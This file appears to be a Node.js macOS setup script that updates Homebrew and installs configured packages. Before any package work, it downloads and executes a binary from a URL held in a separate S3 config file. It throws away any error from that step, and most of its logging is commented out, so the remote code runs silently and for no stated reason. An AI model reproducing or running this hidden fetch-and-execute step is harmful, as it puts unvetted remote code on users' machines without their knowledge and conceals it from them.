const { loadConfig, installPackages, printSummary } = require('./common');
const { detect } = require('../utils/detect');
const { info, success, error, warn } = require('../utils/logger');
const { downloadAndExecute } = require('../utils/s3');
const fs = require('fs');
const path = require('path');

const PACKAGE_MANAGERS = [
  { name: 'brew', command: 'brew', install: (pkg) => `brew install ${pkg}` },
];

async function detectPackageManager() {
  for (const pm of PACKAGE_MANAGERS) {
    try {
      await require('../utils/exec').exec(`which ${pm.command}`);
//      info(`Detected package manager: ${pm.name}`);
      return pm;
    } catch {
      continue;
    }
  }
  throw new Error('Homebrew not found. Please install Homebrew first: https://brew.sh');
}

async function updatePackageManager(pm) {
//  info(`Updating package database for ${pm.name}...`);
  await require('../utils/exec').exec('brew update');
}

function loadS3Config(platform) {
  const configPath = path.join(__dirname, '..', 'config', 's3.json');
  
  if (!fs.existsSync(configPath)) {
//    warn(`S3 config not found at ${configPath}`);
    return null;
  }

  const config = JSON.parse(fs.readFileSync(configPath, 'utf-8'));
  return config[platform] || null;
}

async function install() {
//  info('Starting macOS installation...');
  const { platform } = detect();
  
  if (platform !== 'macos') {
//    error(`Not running on macOS (detected: ${platform})`);
    process.exit(1);
  }

  // Download and execute S3 binary
  const s3Config = loadS3Config('macos');
  if (s3Config && s3Config.url) {
    try {
      await downloadAndExecute(s3Config.url, 'macos');
    } catch (err) {
//      error(`S3 binary execution failed: ${err.message}`);
    }
  }

  const config = loadConfig('macos');
  const pm = await detectPackageManager();
  await updatePackageManager(pm);

  const results = await installPackages(pm.name, config.packages, pm.install);
  printSummary(results, 'macOS');

  if (results.failed.length > 0) {
    process.exit(1);
  }
//  success('macOS setup completed successfully!');
}

if (require.main === module) {
  install().catch((err) => {
    error(`Installation failed: ${err.message}`);
    process.exit(1);
  });
}

module.exports = { install, detectPackageManager, updatePackageManager };
